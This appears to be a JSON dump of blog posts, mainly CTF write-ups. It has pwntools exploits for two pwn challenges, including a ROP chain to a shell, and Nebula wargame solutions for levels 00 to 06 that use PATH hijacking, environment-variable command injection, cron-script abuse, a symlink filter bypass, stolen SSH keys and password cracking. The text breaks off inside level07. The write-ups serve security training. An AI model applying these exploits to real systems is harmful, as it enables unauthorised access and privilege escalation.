[{"title":"Docker","url":"http://yoursite.com/Tools/Docker/","content":"<h1 id=\"TODO\"><a href=\"#TODO\" class=\"headerlink\" title=\"TODO\"></a>TODO</h1><blockquote>\n<p>更换为国内<a href=\"https://lug.ustc.edu.cn/wiki/mirrors/help/docker\" target=\"_blank\" rel=\"external\">中科大镜像源</a></p>\n</blockquote>\n<h2 id=\"基本命令\"><a href=\"#基本命令\" class=\"headerlink\" title=\"基本命令\"></a>基本命令</h2><h3 id=\"容器操作\"><a href=\"#容器操作\" class=\"headerlink\" title=\"容器操作\"></a>容器操作</h3><ol>\n<li><code>docker search</code>搜索镜像</li>\n<li><code>docker pull</code>下载镜像</li>\n<li><code>docker images</code>镜像列表</li>\n<li><code>docker rmi</code>删除</li>\n</ol>\n<h3 id=\"启动容器\"><a href=\"#启动容器\" class=\"headerlink\" title=\"启动容器\"></a>启动容器</h3><p>1.</p>\n","categories":["Tools"],"tags":[]},{"title":"RoutineTraining Pwn","url":"http://yoursite.com/CTF/Writeup/RoutineTraining-Pwn/","content":"<!-- MarkdownTOC -->\n<ul>\n<li><a href=\"#defcon-2015-qualifier\">Defcon 2015 Qualifier</a><ul>\n<li><a href=\"#r0pbaby\">R0pbaby</a></li>\n</ul>\n</li>\n<li><a href=\"#%E6%B9%96%E6%B9%98%E6%9D%AF-2016\">湖湘杯 2016</a><ul>\n<li><a href=\"#pwnme200\">Pwnme200</a></li>\n</ul>\n</li>\n</ul>\n<!-- /MarkdownTOC -->\n<h2 id=\"Defcon-2015-Qualifier\"><a href=\"#Defcon-2015-Qualifier\" class=\"headerlink\" title=\"Defcon 2015 Qualifier\"></a>Defcon 2015 Qualifier</h2><h3 id=\"R0pbaby\"><a href=\"#R0pbaby\" class=\"headerlink\" title=\"R0pbaby\"></a>R0pbaby</h3><p>Vuln Points:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\">__<span class=\"function\">int64 <span class=\"title\">sub_C46</span><span class=\"params\">()</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v0; <span class=\"comment\">// eax@4</span></div><div class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v1; <span class=\"comment\">// r14@15</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// er13@17</span></div><div class=\"line\">  <span class=\"keyword\">size_t</span> v3; <span class=\"comment\">// r12@17</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// eax@18</span></div><div class=\"line\">  <span class=\"keyword\">void</span> *handle; <span class=\"comment\">// [sp+8h] [bp-448h]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> nptr[<span class=\"number\">1088</span>]; <span class=\"comment\">// [sp+10h] [bp-440h]@2</span></div><div class=\"line\">  __int64 savedregs; <span class=\"comment\">// [sp+450h] [bp+0h]@22</span></div><div class=\"line\">...</div><div class=\"line\">...</div><div class=\"line\">        <span class=\"keyword\">if</span> ( v1 )</div><div class=\"line\">        &#123;</div><div class=\"line\">          v2 = <span class=\"number\">0</span>;</div><div class=\"line\">          v3 = <span class=\"number\">0L</span>L;</div><div class=\"line\">          <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</div><div class=\"line\">          &#123;</div><div class=\"line\">            v4 = _IO_getc(<span class=\"built_in\">stdin</span>);</div><div class=\"line\">            <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">-1</span> )</div><div class=\"line\">              <span class=\"keyword\">break</span>;</div><div class=\"line\">            nptr[v3] = v4;</div><div class=\"line\">            ++v2;</div><div class=\"line\">            v3 = v2;</div><div class=\"line\">            <span class=\"keyword\">if</span> ( v1 &lt;= v2 )</div><div class=\"line\">              <span class=\"keyword\">goto</span> LABEL_22;</div><div class=\"line\">          &#125;</div><div class=\"line\">          v3 = v2 + <span class=\"number\">1</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">else</span></div><div class=\"line\">        &#123;</div><div class=\"line\">          v3 = <span class=\"number\">0L</span>L;</div><div class=\"line\">        &#125;</div><div class=\"line\">LABEL_22:</div><div class=\"line\">        <span class=\"built_in\">memcpy</span>(&amp;savedregs, nptr, v3);</div><div class=\"line\">      &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">...</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>Exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getsymbol</span><span class=\"params\">(symbol)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'4) Exit\\n:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Enter symbol:'</span>)</div><div class=\"line\">\tio.sendline(symbol)</div><div class=\"line\">\tdata = io.recvline()</div><div class=\"line\">\tdata = data[data.find(<span class=\"string\">'0x'</span>):<span class=\"number\">-1</span>]</div><div class=\"line\">\tdata = long(data,<span class=\"number\">16</span>)</div><div class=\"line\">\t<span class=\"keyword\">return</span> data</div><div class=\"line\"></div><div class=\"line\">popreiOffset = <span class=\"number\">0x000000000001fc3a</span></div><div class=\"line\">systemOffset = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">log.info(<span class=\"string\">'system offset:'</span> + str(systemOffset))</div><div class=\"line\">binshoffset = libc.search(<span class=\"string\">'/bin/sh'</span>).next()</div><div class=\"line\">log.info(<span class=\"string\">'binsh offset:'</span> + str(binshoffset))</div><div class=\"line\"></div><div class=\"line\">systemAddress = getsymbol(<span class=\"string\">'system'</span>)</div><div class=\"line\">libcbase = systemAddress - systemOffset</div><div class=\"line\">log.info(<span class=\"string\">'libcbase:'</span> + hex(libcbase))</div><div class=\"line\">binshAddress = libcbase + binshoffset</div><div class=\"line\">log.info(<span class=\"string\">'binshAddress:'</span> + hex(binshAddress))</div><div class=\"line\">popreiAddress = libcbase + popreiOffset</div><div class=\"line\">log.info(<span class=\"string\">\"poprdiAddress: \"</span> + hex(popreiAddress))</div><div class=\"line\"></div><div class=\"line\">io.recvuntil(<span class=\"string\">'4) Exit\\n:'</span>)</div><div class=\"line\">io.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">io.recvuntil(<span class=\"string\">'Enter bytes to send (max 1024):'</span>)</div><div class=\"line\">io.sendline(<span class=\"string\">'50'</span>)</div><div class=\"line\"></div><div class=\"line\">raw_input()</div><div class=\"line\"></div><div class=\"line\">payload = <span class=\"string\">'A'</span> * <span class=\"number\">8</span> + p64(popreiAddress) + p64(binshAddress) + p64(systemAddress) + <span class=\"string\">'ABCDABCD'</span></div><div class=\"line\">io.sendline(payload)</div><div class=\"line\">io.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"湖湘杯-2016\"><a href=\"#湖湘杯-2016\" class=\"headerlink\" title=\"湖湘杯 2016\"></a>湖湘杯 2016</h2><h3 id=\"Pwnme200\"><a href=\"#Pwnme200\" class=\"headerlink\" title=\"Pwnme200\"></a>Pwnme200</h3><p>Vuln Points:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getfruit</span><span class=\"params\">()</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> v1; <span class=\"comment\">// [sp+14h] [bp-A4h]@1</span></div><div class=\"line\"></div><div class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please input the name of fruit:\"</span>);</div><div class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%s\"</span>, &amp;v1);</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">\"oh,%s...\\n\"</span>, &amp;v1);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>Exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\">getflagAddress = binary.symbols[<span class=\"string\">'getflag'</span>]</div><div class=\"line\"></div><div class=\"line\">io.recvuntil(<span class=\"string\">'&gt;&gt; 6. Exit'</span>)</div><div class=\"line\">io.sendline(<span class=\"string\">'5'</span>)</div><div class=\"line\">io.recvuntil(<span class=\"string\">'Please input the name of fruit:'</span>)</div><div class=\"line\"></div><div class=\"line\">payload = <span class=\"string\">'A'</span> * <span class=\"number\">168</span> + p32(getflagAddress) + <span class=\"string\">'ABCD'</span></div><div class=\"line\">io.sendline(payload)</div><div class=\"line\"><span class=\"keyword\">print</span> io.recvall()</div></pre></td></tr></table></figure>\n","categories":["CTF","Writeup"],"tags":["Pwn"]},{"title":"Nebula","url":"http://yoursite.com/CTF/Writeup/Nebula/","content":"<h1 id=\"Nebula-Writeup\"><a href=\"#Nebula-Writeup\" class=\"headerlink\" title=\"Nebula Writeup\"></a>Nebula Writeup</h1><!-- MarkdownTOC -->\n<ul>\n<li><a href=\"#level00\">level00</a><ul>\n<li><a href=\"#about\">About</a></li>\n<li><a href=\"#key-points\">Key Points</a></li>\n<li><a href=\"#writeup\">Writeup</a></li>\n</ul>\n</li>\n<li><a href=\"#level-01\">level 01</a><ul>\n<li><a href=\"#about-1\">About</a></li>\n<li><a href=\"#sourcecode\">SourceCode</a></li>\n<li><a href=\"#key-points-1\">Key Points</a></li>\n<li><a href=\"#writeup-1\">Writeup</a></li>\n</ul>\n</li>\n<li><a href=\"#level02\">level02</a><ul>\n<li><a href=\"#about-2\">About</a></li>\n<li><a href=\"#sourcecode-1\">SourceCode</a></li>\n<li><a href=\"#key-points-2\">Key Points</a></li>\n<li><a href=\"#writeups\">Writeups</a></li>\n</ul>\n</li>\n<li><a href=\"#level03\">level03</a><ul>\n<li><a href=\"#about-3\">About</a></li>\n<li><a href=\"#sourcecode-2\">SourceCode</a></li>\n<li><a href=\"#key-points-3\">Key Points</a></li>\n<li><a href=\"#writeups-1\">Writeups</a></li>\n</ul>\n</li>\n<li><a href=\"#level04\">level04</a><ul>\n<li><a href=\"#about-4\">About</a></li>\n<li><a href=\"#sourcecode-3\">SourceCode</a></li>\n<li><a href=\"#key-points-4\">Key Points</a></li>\n<li><a href=\"#writeups-2\">Writeups</a></li>\n</ul>\n</li>\n<li><a href=\"#level05\">level05</a><ul>\n<li><a href=\"#about-5\">About</a></li>\n<li><a href=\"#key-points-5\">Key Points</a></li>\n<li><a href=\"#writeups-3\">Writeups</a></li>\n</ul>\n</li>\n<li><a href=\"#level06\">level06</a><ul>\n<li><a href=\"#about-6\">About</a></li>\n<li><a href=\"#key-points-6\">Key Points</a></li>\n<li><a href=\"#witeups\">Witeups</a></li>\n</ul>\n</li>\n<li><a href=\"#level07\">level07</a><ul>\n<li><a href=\"#about-7\">About</a></li>\n<li><a href=\"#sourcecode-4\">SourceCode</a></li>\n<li><a href=\"#key-points-7\">Key Points</a></li>\n<li><a href=\"#writeups-4\">Writeups</a></li>\n</ul>\n</li>\n<li><a href=\"#level08\">level08</a><ul>\n<li><a href=\"#about-8\">About</a></li>\n<li><a href=\"#key-points-8\">key Points</a></li>\n<li><a href=\"#writeups-5\">Writeups</a></li>\n</ul>\n</li>\n<li><a href=\"#level09\">level09</a><ul>\n<li><a href=\"#about-9\">ABout</a></li>\n<li><a href=\"#sourcecode-5\">SourceCode</a></li>\n<li><a href=\"#key--points\">key  Points</a></li>\n</ul>\n</li>\n</ul>\n<!-- /MarkdownTOC -->\n<h2 id=\"level00\"><a href=\"#level00\" class=\"headerlink\" title=\"level00\"></a>level00</h2><h3 id=\"About\"><a href=\"#About\" class=\"headerlink\" title=\"About\"></a>About</h3><p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>\n<p>Alternatively, look at the find man page.</p>\n<p>To access this level, log in as level00 with the password of level00.</p>\n<h3 id=\"Key-Points\"><a href=\"#Key-Points\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li>find</li>\n<li>uid</li>\n</ul>\n<h3 id=\"Writeup\"><a href=\"#Writeup\" class=\"headerlink\" title=\"Writeup\"></a>Writeup</h3><ul>\n<li>Step 1</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level00@nebula:~$ id flag00</div><div class=\"line\">uid=999(flag00) gid=999(flag00) groups=999(flag00)</div></pre></td></tr></table></figure>\n<ul>\n<li>Step 2</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level00@nebula:~$ find / -uid 999 2&gt;/dev/null</div><div class=\"line\">/bin/.../flag00</div><div class=\"line\">/home/flag00</div><div class=\"line\">/home/flag00/.bash_logout</div><div class=\"line\">/home/flag00/.bashrc</div><div class=\"line\">/home/flag00/.profile</div><div class=\"line\">/rofs/bin/.../flag00</div><div class=\"line\">/rofs/home/flag00</div><div class=\"line\">/rofs/home/flag00/.bash_logout</div><div class=\"line\">/rofs/home/flag00/.bashrc</div><div class=\"line\">/rofs/home/flag00/.profile</div></pre></td></tr></table></figure>\n<ul>\n<li>Step 3</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level00@nebula:~$ /bin/.../flag00 </div><div class=\"line\">Congrats, now run getflag to get your flag!</div><div class=\"line\">flag00@nebula:~$ getflag</div><div class=\"line\">You have successfully executed getflag on a target account</div></pre></td></tr></table></figure>\n<h2 id=\"level-01\"><a href=\"#level-01\" class=\"headerlink\" title=\"level 01\"></a>level 01</h2><h3 id=\"About-1\"><a href=\"#About-1\" class=\"headerlink\" title=\"About\"></a>About</h3><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>\n<p>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p>\n<h3 id=\"SourceCode\"><a href=\"#SourceCode\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/types.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">char</span> **envp)</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  <span class=\"keyword\">gid_t</span> gid;</div><div class=\"line\">  <span class=\"keyword\">uid_t</span> uid;</div><div class=\"line\">  gid = getegid();</div><div class=\"line\">  uid = geteuid();</div><div class=\"line\"></div><div class=\"line\">  setresgid(gid, gid, gid);</div><div class=\"line\">  setresuid(uid, uid, uid);</div><div class=\"line\"></div><div class=\"line\">  system(<span class=\"string\">\"/usr/bin/env echo and now what?\"</span>);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"Key-Points-1\"><a href=\"#Key-Points-1\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li><code>env</code></li>\n<li><a href=\"http://www.linuxidc.com/Linux/2015-01/111459.htm\" target=\"_blank\" rel=\"external\">修改环境变量</a></li>\n</ul>\n<h3 id=\"Writeup-1\"><a href=\"#Writeup-1\" class=\"headerlink\" title=\"Writeup\"></a>Writeup</h3><ul>\n<li>Step 1</li>\n</ul>\n<p><code>level01@nebula:~$ ln -s /bin/getflag  echo</code></p>\n<ul>\n<li>Step 2 </li>\n</ul>\n<p><code>level01@nebula:~$ export PATH=/home/level01:$PATH</code></p>\n<ul>\n<li>Step 3</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level01@nebula:~$ ../flag01/flag01 </div><div class=\"line\">You have successfully executed getflag on a target account</div></pre></td></tr></table></figure>\n<h2 id=\"level02\"><a href=\"#level02\" class=\"headerlink\" title=\"level02\"></a>level02</h2><h3 id=\"About-2\"><a href=\"#About-2\" class=\"headerlink\" title=\"About\"></a>About</h3><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>\n<p>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>\n<h3 id=\"SourceCode-1\"><a href=\"#SourceCode-1\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/types.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">char</span> **envp)</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> *buffer;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">gid_t</span> gid;</div><div class=\"line\">  <span class=\"keyword\">uid_t</span> uid;</div><div class=\"line\"></div><div class=\"line\">  gid = getegid();</div><div class=\"line\">  uid = geteuid();</div><div class=\"line\"></div><div class=\"line\">  setresgid(gid, gid, gid);</div><div class=\"line\">  setresuid(uid, uid, uid);</div><div class=\"line\"></div><div class=\"line\">  buffer = <span class=\"literal\">NULL</span>;</div><div class=\"line\"></div><div class=\"line\">  asprintf(&amp;buffer, <span class=\"string\">\"/bin/echo %s is cool\"</span>, getenv(<span class=\"string\">\"USER\"</span>));</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"about to call system(\\\"%s\\\")\\n\"</span>, buffer);</div><div class=\"line\">  </div><div class=\"line\">  system(buffer);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"Key-Points-2\"><a href=\"#Key-Points-2\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li>环境变量</li>\n</ul>\n<h3 id=\"Writeups\"><a href=\"#Writeups\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><ul>\n<li>Step 1</li>\n</ul>\n<p><code>level02@nebula:~$ export USER=&quot;&amp;&amp; /bin/getflag&quot;</code></p>\n<h2 id=\"level03\"><a href=\"#level03\" class=\"headerlink\" title=\"level03\"></a>level03</h2><h3 id=\"About-3\"><a href=\"#About-3\" class=\"headerlink\" title=\"About\"></a>About</h3><p>Check the home directory of flag03 and take note of the files there.</p>\n<p>There is a crontab that is called every couple of minutes.</p>\n<p>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p>\n<h3 id=\"SourceCode-2\"><a href=\"#SourceCode-2\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/sh</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> /home/flag03/writable.d/* ; <span class=\"keyword\">do</span></div><div class=\"line\">    (<span class=\"built_in\">ulimit</span> -t 5; bash -x <span class=\"string\">\"<span class=\"variable\">$i</span>\"</span>)</div><div class=\"line\">    rm -f <span class=\"string\">\"<span class=\"variable\">$i</span>\"</span></div><div class=\"line\"><span class=\"keyword\">done</span></div></pre></td></tr></table></figure>\n<h3 id=\"Key-Points-3\"><a href=\"#Key-Points-3\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li><a href=\"http://www.jb51.net/LINUXjishu/151805.html\" target=\"_blank\" rel=\"external\">Crontab</a></li>\n<li>shell脚本</li>\n</ul>\n<h3 id=\"Writeups-1\"><a href=\"#Writeups-1\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><ul>\n<li><code>/home/flag03/writable.d</code> 下建一个可执行脚本</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level03@nebula:/home/flag03/writable.d$ echo \"/bin/getflag &gt; /tmp/flag\" &gt; test.sh</div></pre></td></tr></table></figure>\n<p>PS:</p>\n<ul>\n<li><code>sudo ls /var/spool/cron/crontabs</code></li>\n</ul>\n<h2 id=\"level04\"><a href=\"#level04\" class=\"headerlink\" title=\"level04\"></a>level04</h2><h3 id=\"About-4\"><a href=\"#About-4\" class=\"headerlink\" title=\"About\"></a>About</h3><p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>\n<p>To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.</p>\n<h3 id=\"SourceCode-3\"><a href=\"#SourceCode-3\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/types.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">char</span> **envp)</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> buf[<span class=\"number\">1024</span>];</div><div class=\"line\">  <span class=\"keyword\">int</span> fd, rc;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span>(argc == <span class=\"number\">1</span>) &#123;</div><div class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"%s [file to read]\\n\"</span>, argv[<span class=\"number\">0</span>]);</div><div class=\"line\">      <span class=\"built_in\">exit</span>(EXIT_FAILURE);</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"built_in\">strstr</span>(argv[<span class=\"number\">1</span>], <span class=\"string\">\"token\"</span>) != <span class=\"literal\">NULL</span>) &#123;</div><div class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"You may not access '%s'\\n\"</span>, argv[<span class=\"number\">1</span>]);</div><div class=\"line\">      <span class=\"built_in\">exit</span>(EXIT_FAILURE);</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  fd = open(argv[<span class=\"number\">1</span>], O_RDONLY);</div><div class=\"line\">  <span class=\"keyword\">if</span>(fd == <span class=\"number\">-1</span>) &#123;</div><div class=\"line\">      err(EXIT_FAILURE, <span class=\"string\">\"Unable to open %s\"</span>, argv[<span class=\"number\">1</span>]);</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  rc = read(fd, buf, <span class=\"keyword\">sizeof</span>(buf));</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"keyword\">if</span>(rc == <span class=\"number\">-1</span>) &#123;</div><div class=\"line\">      err(EXIT_FAILURE, <span class=\"string\">\"Unable to read fd %d\"</span>, fd);</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  write(<span class=\"number\">1</span>, buf, rc);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"Key-Points-4\"><a href=\"#Key-Points-4\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li><code>strstr</code></li>\n</ul>\n<h3 id=\"Writeups-2\"><a href=\"#Writeups-2\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><ul>\n<li>Step 1</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level04@nebula:/tmp$ ln -s /home/flag04/token flag04</div><div class=\"line\">level04@nebula:/tmp$ /home/flag04/flag04 /tmp/flag04</div><div class=\"line\">06508b5e-8909-4f38-b630-fdb148a848a2</div></pre></td></tr></table></figure>\n<ul>\n<li>Step 2</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">nebula@nebula:~$ su flag04</div><div class=\"line\">Password: </div><div class=\"line\">sh-4.2$ getflag</div><div class=\"line\">You have successfully executed getflag on a target account</div></pre></td></tr></table></figure>\n<h2 id=\"level05\"><a href=\"#level05\" class=\"headerlink\" title=\"level05\"></a>level05</h2><h3 id=\"About-5\"><a href=\"#About-5\" class=\"headerlink\" title=\"About\"></a>About</h3><p>Check the flag05 home directory. You are looking for weak directory permissions</p>\n<p>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p>\n<h3 id=\"Key-Points-5\"><a href=\"#Key-Points-5\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><ul>\n<li>ssh </li>\n</ul>\n<h3 id=\"Writeups-3\"><a href=\"#Writeups-3\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><ul>\n<li>Step 1</li>\n</ul>\n<p><code>level05@nebula:/home/flag05/.backup$ tar xvf backup-19072011.tgz -C /tmp/</code></p>\n<ul>\n<li>Step 2</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">level05@nebula:~$ cp -r /tmp/.ssh/ ~</div><div class=\"line\">level05@nebula:~$ ssh flag05@localhost</div></pre></td></tr></table></figure>\n<h2 id=\"level06\"><a href=\"#level06\" class=\"headerlink\" title=\"level06\"></a>level06</h2><h3 id=\"About-6\"><a href=\"#About-6\" class=\"headerlink\" title=\"About\"></a>About</h3><p>The flag06 account credentials came from a legacy unix system.</p>\n<p>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.</p>\n<h3 id=\"Key-Points-6\"><a href=\"#Key-Points-6\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><h3 id=\"Witeups\"><a href=\"#Witeups\" class=\"headerlink\" title=\"Witeups\"></a>Witeups</h3><ul>\n<li>Step 1</li>\n</ul>\n<p>copy出<code>/etc/passwd</code>文件    </p>\n<ul>\n<li>Step 2</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">➜  Desktop john passwd </div><div class=\"line\">Using default input encoding: UTF-8</div><div class=\"line\">Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16])</div><div class=\"line\">Press 'q' or Ctrl-C to abort, almost any other key for status</div><div class=\"line\">hello            (flag06)</div><div class=\"line\">1g 0:00:00:00 DONE 2/3 (2017-06-25 15:41) 25.00g/s 18750p/s 18750c/s 18750C/s 123456..marley</div><div class=\"line\">Use the \"--show\" option to display all of the cracked passwords reliably</div><div class=\"line\">Session completed</div></pre></td></tr></table></figure>\n<h2 id=\"level07\"><a href=\"#level07\" class=\"headerlink\" title=\"level07\"></a>level07</h2><h3 id=\"About-7\"><a href=\"#About-7\" class=\"headerlink\" title=\"About\"></a>About</h3><p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>\n<p>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.</p>\n<h3 id=\"SourceCode-4\"><a href=\"#SourceCode-4\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight perl\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/perl</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">use</span> CGI <span class=\"string\">qw&#123;param&#125;</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Content-type: text/html\\n\\n\"</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">ping</span> </span>&#123;</div><div class=\"line\">  $host = $_[<span class=\"number\">0</span>];</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">print</span>(<span class=\"string\">\"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping 